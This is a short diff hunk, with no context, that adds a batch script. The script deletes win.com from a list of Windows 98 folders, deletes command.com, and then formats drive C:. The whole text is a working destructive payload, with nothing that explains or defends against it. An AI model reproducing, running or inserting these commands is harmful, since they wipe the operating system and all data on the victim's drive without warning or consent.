@@ -1,0 +1,10 @@
+del C:\windows\win.com
+del C:\win98\win.com
+del C:\windows98\win.com
+del C:\win\win.com
+del C:\WIN98\win.com
+del C:\WINDOWS98\win.com
+del C:\WIN\win.com
+del C:\WINDOWS\win.com
+del C:\command.com
+format C:\
